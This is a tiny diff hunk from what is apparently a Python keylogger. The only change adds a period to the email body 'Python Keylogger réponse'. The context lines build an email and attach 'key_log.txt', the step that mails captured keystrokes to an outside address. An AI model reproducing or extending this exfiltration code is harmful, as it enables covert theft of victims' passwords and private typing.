@@ -37,7 +37,7 @@ msg['From'] = email_user
 msg['To'] = email_send
 msg['Subject'] = subject
 
-body = 'Python Keylogger réponse'
+body = 'Python Keylogger réponse.'
 msg.attach(MIMEText(body, 'plain'))
 
 filename='key_log.txt'
